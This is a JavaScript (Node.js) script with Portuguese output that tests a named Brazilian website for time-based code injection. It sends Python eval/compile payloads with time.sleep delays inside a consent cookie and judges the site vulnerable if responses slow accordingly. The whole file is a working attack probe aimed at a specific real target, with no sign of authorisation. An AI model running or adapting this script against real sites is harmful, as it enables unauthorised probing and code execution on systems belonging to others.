const axios = require('axios');
const Cookie = require('cookie');

const url = 'https://www.sebraepr.com.br/';
const payloads = [2, 4, 7, 10];

async function testVulnerability() {
  console.log('Iniciando teste de vulnerabilidade em:', url);
  let results = [];

  for (let time of payloads) {
    const payload = `eval(compile('for x in range(1): import time; time.sleep(${time})','a','exec'))`;
    const encodedPayload = encodeURIComponent(payload);

    const startTime = Date.now();

    try {
      await axios.get(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Cookie': `uncode_privacy[consent_types]=${encodedPayload}`,
        },
        timeout: (time + 10) * 1000, // Timeout maior que o tempo de espera
      });

      const endTime = Date.now();
      const responseTime = (endTime - startTime) / 1000;

      results.push({
        payload: `time.sleep(${time})`,
        responseTime: responseTime,
      });

      console.log(`Payload: time.sleep(${time}) - Tempo de resposta: ${responseTime} segundos`);
    } catch (error) {
      if (error.code === 'ECONNABORTED') {
        console.log(`Payload: time.sleep(${time}) - A requisição excedeu o tempo limite.`);
        results.push({
          payload: `time.sleep(${time})`,
          responseTime: '> timeout',
        });
      } else {
        console.error(`Erro ao testar com payload time.sleep(${time}):`, error.message);
        results.push({
          payload: `time.sleep(${time})`,
          responseTime: 'erro',
        });
      }
    }
  }

  generateReport(results);
}

function generateReport(results) {
  console.log('\n=== Relatório de Teste de Vulnerabilidade ===\n');

  let isVulnerable = false;

  for (let i = 1; i < results.length; i++) {
    if (
      results[i].responseTime !== '> timeout' &&
      results[i - 1].responseTime !== '> timeout' &&
      results[i].responseTime > results[i - 1].responseTime + 1
    ) {
      isVulnerable = true;
      break;
    }
  }

  if (isVulnerable) {
    console.log('Resultado: O site pode estar **VULNERÁVEL** à injeção de código baseada em tempo.');
  } else {
    console.log('Resultado: O site **NÃO apresentou evidências de vulnerabilidade** de injeção de código baseada em tempo.');
  }

  console.log('\nDetalhes dos Testes:');
  results.forEach(result => {
    console.log(`Payload: ${result.payload} - Tempo de resposta: ${result.responseTime} segundos`);
  });
}

testVulnerability();
